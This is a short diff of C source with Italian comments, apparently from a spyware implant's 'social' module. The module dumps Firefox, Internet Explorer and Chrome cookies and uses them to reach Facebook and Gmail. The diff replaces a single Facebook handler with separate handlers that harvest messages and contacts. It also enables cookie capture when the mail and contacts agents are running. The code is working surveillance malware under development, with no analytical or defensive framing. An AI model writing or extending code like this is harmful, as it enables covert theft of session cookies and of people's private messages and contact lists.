@@ -17,7 +17,8 @@
 #include "NetworkHandler.h"
 
 extern DWORD HandleGMail(char *); // Handler per GMail
-extern DWORD HandleFaceBook(char *); // Handler per FaceBook
+extern DWORD HandleFBMessages(char *); // Handler per FaceBook
+extern DWORD HandleFBContacts(char *); // Handler per FaceBook
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(void); // Cookie per IExplorer
 extern int DumpCHCookies(void); // Cookie per Chrome
@@ -27,6 +28,8 @@ extern BOOL IsCrisisNetwork();
 extern DWORD social_process_control; // Variabile per il controllo del processo. Dichiarata nell'agente principale
 
 extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
+extern BOOL bPM_MailStarted;
+extern BOOL bPM_ContactsStarted;
 
 social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
 
@@ -191,9 +194,12 @@ void InitSocialEntries()
 		social_entry[i].wait_cookie = TRUE;
 	}
 	wcscpy_s(social_entry[0].domain, FACEBOOK_DOMAIN);
-	social_entry[0].RequestHandler = HandleFaceBook;
+	social_entry[0].RequestHandler = HandleFBMessages;
 	wcscpy_s(social_entry[1].domain, GMAIL_DOMAIN);
 	social_entry[1].RequestHandler = HandleGMail;
+	wcscpy_s(social_entry[2].domain, FACEBOOK_DOMAIN);
+	social_entry[2].RequestHandler = HandleFBContacts;
+
 }
 
 void SocialMainLoop()
@@ -212,8 +218,8 @@ void SocialMainLoop()
 			CheckProcessStatus();
 		}
 
-		// XXX Aggiungo gli altri agenti interessati
-		if (!bPM_IMStarted /*&& !bPM_MailStarted*/)
+		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
+		if (!bPM_IMStarted && !bPM_MailStarted && !bPM_ContactsStarted)
 			continue;
 
 		// Verifica se qualcuno e' in attesa di nuovi cookies
